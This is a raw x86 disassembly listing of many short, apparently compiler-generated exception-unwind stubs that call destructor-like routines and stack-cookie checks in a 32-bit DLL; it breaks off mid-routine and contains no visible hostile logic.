jmp sub_10014910
sub_10051529
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x104 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051560
mov eax [ ebp - 0x524 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x524 ] 0xfffffffe
mov ecx [ ebp - 0x540 ]
jmp sub_10001880
sub_10051582
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x544 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_100515b0
lea ecx [ ebp - 0xd0 ]
jmp sub_10014910
sub_100515bb
lea ecx [ ebp - 0x90 ]
jmp sub_10001880
sub_100515c6
lea ecx [ ebp - 0x78 ]
jmp sub_100036b0
sub_100515ce
lea ecx [ ebp - 0x58 ]
jmp sub_10001880
sub_100515d6
lea ecx [ ebp - 0x40 ]
jmp sub_10004970
sub_100515de
lea ecx [ ebp - 0x34 ]
jmp sub_10004970
sub_100515e6
lea ecx [ ebp - 0x90 ]
jmp sub_10014980
sub_100515f1
lea ecx [ ebp - 0x28 ]
jmp sub_10001880
sub_100515f9
lea ecx [ ebp - 0xa8 ]
jmp sub_10001880
sub_10051604
lea ecx [ ebp - 0xc0 ]
jmp sub_10001880
sub_1005160f
mov eax [ ebp - 0xd8 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0xd8 ] 0xfffffffe
mov ecx [ ebp - 0xdc ]
jmp sub_10014910
sub_10051631
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xe4 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051660
lea ecx [ ebp - 0x130 ]
jmp sub_1002c100
sub_1005166b
mov eax [ ebp - 0x14c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14c ] 0xfffffffe
mov ecx [ ebp - 0x150 ]
jmp sub_10014910
sub_1005168d
lea ecx [ ebp - 0x13c ]
jmp sub_10014910
sub_10051698
lea ecx [ ebp - 0x148 ]
jmp sub_10014910
sub_100516a3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x154 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_100516d0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_100516f0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051710
mov ecx [ ebp - 0x10 ]
jmp sub_10001880
sub_10051718
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_100036b0
sub_10051723
mov ecx [ ebp - 0x10 ]
add ecx 0x38
jmp sub_10001880
sub_1005172e
mov ecx [ ebp - 0x10 ]
add ecx 0x50
jmp sub_10004970
sub_10051739
mov ecx [ ebp - 0x10 ]
add ecx 0x5c
jmp sub_10004970
sub_10051744
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051760
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051780
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_100517a0
lea ecx [ ebp + 0x8 ]
jmp sub_10001880
sub_100517a8
mov ecx [ ebp - 0x10 ]
jmp sub_10001880
sub_100517b0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_100517d0
lea ecx [ ebp + 0x8 ]
jmp sub_10028720
sub_100517d8
lea ecx [ ebp + 0x8 ]
jmp sub_10001880
sub_100517e0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051800
lea ecx [ ebp + 0x8 ]
jmp sub_10001880
sub_10051808
mov ecx [ ebp - 0x30 ]
jmp sub_10001880
sub_10051810
lea ecx [ ebp - 0x2c ]
jmp sub_10028720
sub_10051818
mov ecx [ ebp - 0x34 ]
jmp sub_10001880
sub_10051820
mov ecx [ ebp - 0x30 ]
jmp sub_10028720
sub_10051828
lea ecx [ ebp - 0x2c ]
jmp sub_10001880
sub_10051830
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051860
lea ecx [ ebp + 0x8 ]
jmp sub_10001880
sub_10051868
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051890
lea ecx [ ebp + 0x8 ]
jmp sub_10001880
sub_10051898
lea ecx [ ebp - 0x34 ]
jmp sub_100036e0
sub_100518a0
lea ecx [ ebp - 0x20 ]
jmp sub_100036e0
sub_100518a8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_100518d0
lea ecx [ ebp - 0x28 ]
jmp sub_10001880
sub_100518d8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051900
lea ecx [ ebp + 0x14 ]
jmp sub_10004970
sub_10051908
lea ecx [ ebp + 0x8 ]
jmp sub_10004970
sub_10051910
lea ecx [ ebp + 0x38 ]
jmp sub_10001880
sub_10051918
lea ecx [ ebp + 0x20 ]
jmp sub_10001880
sub_10051920
mov eax [ ebp - 0x48 ]
push eax
call j_sub_1003f3e3#2
pop ecx
retn
sub_1005192b
mov ecx [ ebp - 0x48 ]
jmp sub_10004530
sub_10051933
mov eax [ ebp - 0x48 ]
push eax
call j_sub_1003f3e3#2
pop ecx
retn
sub_1005193e
mov ecx [ ebp - 0x48 ]
jmp sub_10004530
sub_10051946
mov eax [ ebp - 0x48 ]
push eax
call j_sub_1003f3e3#2
pop ecx
retn
sub_10051951
mov ecx [ ebp - 0x48 ]
jmp sub_10004530
sub_10051959
mov eax [ ebp - 0x48 ]
push eax
call j_sub_1003f3e3#2
pop ecx
retn
sub_10051964
mov ecx [ ebp - 0x48 ]
jmp sub_10004530
sub_1005196c
mov eax [ ebp - 0x48 ]
push eax
call j_sub_1003f3e3#2
pop ecx
retn
sub_10051977
mov ecx [ ebp - 0x48 ]
jmp sub_10004530
sub_1005197f
mov eax [ ebp - 0x48 ]
push eax
call j_sub_1003f3e3#2
pop ecx
retn
sub_1005198a
mov ecx [ ebp - 0x48 ]
jmp sub_10004530
sub_10051992
mov eax [ ebp - 0x48 ]
push eax
call j_sub_1003f3e3#2
pop ecx
retn
sub_1005199d
mov ecx [ ebp - 0x48 ]
jmp sub_10004530
sub_100519a5
lea ecx [ ebp - 0x78 ]
jmp sub_10001880
sub_100519ad
lea ecx [ ebp - 0x40 ]
jmp sub_10001880
sub_100519b5
mov eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call sub_10001140
add esp 0x8
retn
sub_100519c6
mov eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x54 ]
push eax
call sub_10001140
add esp 0x8
retn
sub_100519d7
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x5c ]
push eax
call sub_10001140
add esp 0x8
retn
sub_100519e8
mov eax [ ebp - 0x58 ]
push eax
mov eax [ ebp - 0x50 ]
push eax
call sub_10001140
add esp 0x8
retn
sub_100519f9
lea ecx [ ebp - 0x28 ]
jmp sub_10001880
sub_10051a01
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x5c ]
push eax
call sub_10001140
add esp 0x8
retn
sub_10051a12
mov eax [ ebp - 0x58 ]
push eax
mov eax [ ebp - 0x50 ]
push eax
call sub_10001140
add esp 0x8
retn
sub_10051a23
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x5c ]
push eax
call sub_10001140
add esp 0x8
retn
sub_10051a34
mov eax [ ebp - 0x58 ]
push eax
mov eax [ ebp - 0x50 ]
push eax
call sub_10001140
add esp 0x8
retn
sub_10051a45
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x84 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051a70
lea ecx [ ebp + 0x8 ]
jmp sub_10001880
sub_10051a78
lea ecx [ ebp - 0x48 ]
jmp sub_10001880
sub_10051a80
lea ecx [ ebp - 0x70 ]
jmp sub_10004970
sub_10051a88
lea ecx [ ebp - 0x30 ]
jmp sub_10001880
sub_10051a90
lea ecx [ ebp - 0x24 ]
jmp sub_10004970
sub_10051a98
lea ecx [ ebp - 0x60 ]
jmp sub_10001880
sub_10051aa0
mov ecx [ ebp - 0x64 ]
jmp sub_10001880
sub_10051aa8
mov ecx [ ebp - 0x7c ]
jmp sub_10001880
sub_10051ab0
mov ecx [ ebp - 0x80 ]
jmp sub_10004970
sub_10051ab8
mov ecx [ ebp - 0x78 ]
jmp sub_10004970
sub_10051ac0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x84 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051af0
lea ecx [ ebp + 0x8 ]
jmp sub_10001880
sub_10051af8
lea ecx [ ebp - 0x40 ]
jmp sub_10001880
sub_10051b00
lea ecx [ ebp - 0x28 ]
jmp sub_10001880
sub_10051b08
mov eax [ ebp - 0x44 ]
push eax
call j_sub_1003f3e3#2
pop ecx
retn
sub_10051b13
mov ecx [ ebp - 0x48 ]
jmp sub_10001880
sub_10051b1b
mov ecx [ ebp - 0x54 ]
jmp sub_100036b0
sub_10051b23
mov ecx [ ebp - 0x50 ]
jmp sub_10001880
sub_10051b2b
mov ecx [ ebp - 0x48 ]
jmp sub_100036b0
sub_10051b33
mov ecx [ ebp - 0x50 ]
jmp sub_10001880
sub_10051b3b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051b60
lea ecx [ ebp + 0x8 ]
jmp sub_10001880
sub_10051b68
lea ecx [ ebp - 0x28 ]
jmp sub_10001880
sub_10051b70
mov ecx [ ebp - 0x34 ]
jmp sub_10001880
sub_10051b78
mov ecx [ ebp - 0x34 ]
jmp sub_10001880
sub_10051b80
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051bb0
lea ecx [ ebp + 0x8 ]
jmp sub_10001880
sub_10051bb8
lea ecx [ ebp - 0x28 ]
jmp sub_10001880
sub_10051bc0
mov ecx [ ebp - 0x30 ]
jmp sub_10001880
sub_10051bc8
mov ecx [ ebp - 0x30 ]
jmp sub_10001880
sub_10051bd0
mov ecx [ ebp - 0x30 ]
jmp sub_10001880
sub_10051bd8
mov ecx [ ebp - 0x30 ]
jmp sub_10001880
sub_10051be0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051c10
lea ecx [ ebp + 0x8 ]
jmp sub_10001880
sub_10051c18
lea ecx [ ebp - 0x28 ]
jmp sub_10001880
sub_10051c20
mov ecx [ ebp - 0x44 ]
jmp sub_10001880
sub_10051c28
mov ecx [ ebp - 0x44 ]
jmp sub_10001880
sub_10051c30
lea ecx [ ebp - 0x40 ]
jmp sub_10001880
sub_10051c38
mov ecx [ ebp - 0x44 ]
jmp sub_10001880
sub_10051c40
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x44 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051c70
lea ecx [ ebp - 0x28 ]
jmp sub_10001880
sub_10051c78
lea ecx [ ebp - 0x58 ]
jmp sub_10001880
sub_10051c80
lea ecx [ ebp - 0x40 ]
jmp sub_10001880
sub_10051c88
mov ecx [ ebp - 0x60 ]
jmp sub_10001880
sub_10051c90
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051cc0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051ce0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051d00
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051d20
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051d40
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051d60
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call sub_10001140
add esp 0x8
retn
sub_10051d71
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051d90
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
add ecx 0x10
jmp sub_100301e0
sub_10051dac
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051dd0
mov ecx [ ebp - 0x10 ]
jmp sub_10027d30
sub_10051dd8
mov ecx [ ebp - 0x10 ]
jmp sub_1003b400
sub_10051de0
mov ecx [ ebp - 0x14 ]
jmp sub_10004280
sub_10051de8
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_1003b2c0
sub_10051df3
mov ecx [ ebp - 0x10 ]
add ecx 0x34
jmp sub_100036e0
sub_10051dfe
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051e20
mov ecx [ ebp - 0x10 ]
jmp sub_1003b400
sub_10051e28
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_1003b2c0
sub_10051e33
mov ecx [ ebp - 0x10 ]
add ecx 0x34
jmp sub_100036e0
sub_10051e3e
mov ecx [ ebp - 0x14 ]
jmp sub_10004280
sub_10051e46
mov ecx [ ebp - 0x10 ]
jmp sub_10027d30
sub_10051e4e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051e70
lea ecx [ ebp - 0x14 ]
jmp sub_10027d70
sub_10051e78
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051ea0
lea ecx [ ebp - 0x44 ]
jmp sub_10001880
sub_10051ea8
lea ecx [ ebp - 0x4c ]
jmp sub_10027d70
sub_10051eb0
lea ecx [ ebp - 0x2c ]
jmp sub_10001880
sub_10051eb8
mov eax [ ebp - 0x64 ]
push eax
mov eax [ ebp - 0x48 ]
push eax
call sub_10001140
add esp 0x8
retn
sub_10051ec9
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x64 ]
mov ecx [ edx - 0x68 ]
xor ecx eax
call sub_1003c623
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051f00
lea ecx [ ebp - 0x28 ]
jmp sub_10001880
sub_10051f08
lea ecx [ ebp - 0x3c ]
jmp sub_10027d70
sub_10051f10
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x44 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051f40
mov ecx [ ebp - 0x10 ]
jmp sub_100324b0
sub_10051f48
mov ecx [ ebp - 0x10 ]
jmp sub_10029eb0
sub_10051f50
mov ecx [ ebp - 0x10 ]
jmp sub_100095b0
sub_10051f58
mov ecx [ ebp - 0x10 ]
jmp sub_10009720
sub_10051f60
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10051f80
lea ecx [ ebp + 0x8 ]
jmp sub_100047b0
sub_10051f88
mov ecx [ ebp - 0x24 ]
jmp sub_10004280
sub_10051f90
mov ecx [ ebp - 0x24 ]
add ecx 0x4
jmp sub_10001880
sub_10051f9b
mov ecx [ ebp - 0x10 ]
jmp sub_10009720
sub_10051fa3
mov ecx [ ebp - 0x10 ]
jmp sub_100095b0
sub_10051fab
mov ecx [ ebp - 0x10 ]
jmp sub_10029eb0
sub_10051fb3
mov ecx [ ebp - 0x10 ]
jmp sub_100324b0
sub_10051fbb
mov ecx [ ebp - 0x24 ]
add ecx 0x1c
jmp sub_10030e40
sub_10051fc6
mov ecx [ ebp - 0x18 ]
jmp sub_10009720
sub_10051fce
mov ecx [ ebp - 0x18 ]
jmp sub_100095b0
sub_10051fd6
mov ecx [ ebp - 0x18 ]
jmp sub_10029eb0
sub_10051fde
mov ecx [ ebp - 0x18 ]
jmp sub_100324b0
sub_10051fe6
mov ecx [ ebp - 0x24 ]
add ecx 0x24
jmp sub_10030e40
sub_10051ff1
mov ecx [ ebp - 0x10 ]
jmp sub_10009720
sub_10051ff9
mov ecx [ ebp - 0x10 ]
jmp sub_100095b0
sub_10052001
mov ecx [ ebp - 0x10 ]
jmp sub_10029eb0
sub_10052009
mov ecx [ ebp - 0x10 ]
jmp sub_100324b0
sub_10052011
mov ecx [ ebp - 0x24 ]
add ecx 0x2c
jmp sub_10030e40
sub_1005201c
mov ecx [ ebp - 0x24 ]
add ecx 0x34
jmp sub_1003b620
sub_10052027
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10052050
mov ecx [ ebp - 0x10 ]
jmp sub_10004280
sub_10052058
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_10001880
sub_10052063
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_10030e40
sub_1005206e
mov ecx [ ebp - 0x10 ]
add ecx 0x24
jmp sub_10030e40
sub_10052079
mov ecx [ ebp - 0x10 ]
add ecx 0x2c
jmp sub_10030e40
sub_10052084
mov ecx [ ebp - 0x10 ]
add ecx 0x34
jmp sub_1003b620
sub_1005208f
mov ecx [ ebp - 0x14 ]
jmp sub_100324b0
sub_10052097
mov ecx [ ebp - 0x14 ]
jmp sub_10029eb0
sub_1005209f
mov ecx [ ebp - 0x14 ]
jmp sub_100095b0
sub_100520a7
mov ecx [ ebp - 0x14 ]
jmp sub_10009720
sub_100520af
mov ecx [ ebp - 0x18 ]
jmp sub_100324b0
sub_100520b7
mov ecx [ ebp - 0x18 ]
jmp sub_10029eb0
sub_100520bf
mov ecx [ ebp - 0x18 ]
jmp sub_100095b0
sub_100520c7
mov ecx [ ebp - 0x18 ]
jmp sub_10009720
sub_100520cf
mov ecx [ ebp - 0x18 ]
jmp sub_100324b0
sub_100520d7
mov ecx [ ebp - 0x18 ]
jmp sub_10029eb0
sub_100520df
mov ecx [ ebp - 0x18 ]
jmp sub_100095b0
sub_100520e7
mov ecx [ ebp - 0x18 ]
jmp sub_10009720
sub_100520ef
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10052110
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_10001880
sub_10052129
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10052150
lea ecx [ ebp - 0x28 ]
jmp sub_10001880
sub_10052158
mov eax [ ebp - 0x64 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x64 ] 0xfffffffe
mov ecx [ ebp - 0x78 ]
jmp sub_10001880
sub_10052171
lea ecx [ ebp - 0x58 ]
jmp sub_10009720
sub_10052179
lea ecx [ ebp - 0x58 ]
jmp sub_100095b0
sub_10052181
lea ecx [ ebp - 0x58 ]
jmp sub_10029eb0
sub_10052189
lea ecx [ ebp - 0x58 ]
jmp sub_100325d0
sub_10052191
lea ecx [ ebp - 0x58 ]
jmp sub_10031830
sub_10052199
lea ecx [ ebp - 0x40 ]
jmp sub_10001880
sub_100521a1
mov ecx [ ebp - 0x70 ]
jmp sub_10001880
sub_100521a9
lea ecx [ ebp - 0x58 ]
jmp sub_100325d0
sub_100521b1
lea ecx [ ebp - 0x58 ]
jmp sub_10029eb0
sub_100521b9
lea ecx [ ebp - 0x58 ]
jmp sub_100095b0
sub_100521c1
lea ecx [ ebp - 0x58 ]
jmp sub_10009720
sub_100521c9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x7c ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_100521f0
mov ecx [ ebp - 0x10 ]
jmp sub_100325d0
sub_100521f8
mov ecx [ ebp - 0x10 ]
jmp sub_10029eb0
sub_10052200
mov ecx [ ebp - 0x10 ]
jmp sub_100095b0
sub_10052208
mov ecx [ ebp - 0x10 ]
jmp sub_10009720
sub_10052210
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10052230
mov eax [ ebp - 0x30 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffe
mov ecx [ ebp - 0x44 ]
jmp sub_10001880
sub_10052249
mov eax [ ebp - 0x30 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffd
lea ecx [ ebp - 0x28 ]
jmp sub_10001880
sub_10052262
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10052290
lea ecx [ ebp - 0x2c ]
jmp sub_10001880
sub_10052298
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x44 ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_1003c623
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_100522c0
lea ecx [ ebp - 0x28 ]
jmp sub_10001880
sub_100522c8
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
mov ecx [ ebp - 0x38 ]
jmp sub_10001880
sub_100522e1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10052310
lea ecx [ ebp - 0x8c ]
jmp sub_10004970
sub_1005231b
lea ecx [ ebp - 0x28 ]
jmp sub_10001880
sub_10052323
lea ecx [ ebp - 0x40 ]
jmp sub_10001880
sub_1005232b
lea ecx [ ebp - 0x58 ]
jmp sub_10001880
sub_10052333
mov eax [ ebp - 0x94 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x94 ] 0xfffffffe
mov ecx [ ebp - 0x9c ]
jmp sub_10001880
sub_10052355
lea ecx [ ebp - 0x70 ]
jmp sub_10001880
sub_1005235d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa0 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10052390
mov ecx [ ebp - 0x14 ]
jmp sub_10001880
sub_10052398
mov ecx [ ebp - 0x14 ]
add ecx 0x18
jmp sub_10001880
sub_100523a3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_100523c0
mov ecx [ ebp + 0x8 ]
jmp sub_10001880
sub_100523c8
mov ecx [ ebp + 0x8 ]
add ecx 0x18
jmp sub_10001880
sub_100523d3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_100523f0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10052410
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10052430
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10052450
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call sub_10001140
add esp 0x8
retn
sub_10052461
mov ecx [ ebp - 0x1c ]
jmp sub_10001880
sub_10052469
mov ecx [ ebp - 0x1c ]
add ecx 0x18
jmp sub_10001880
sub_10052474
mov ecx [ ebp - 0x1c ]
jmp sub_10033e80
sub_1005247c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_100524a0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_100524c0
mov ecx [ ebp + 0x8 ]
jmp sub_10001880
sub_100524c8
mov ecx [ ebp + 0x8 ]
add ecx 0x18
jmp sub_10001880
sub_100524d3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_100524f0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10052510
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_10052530
mov ecx [ ebp - 0x10 ]
jmp sub_10001880
sub_10052538
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_10001880
sub_10052543
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
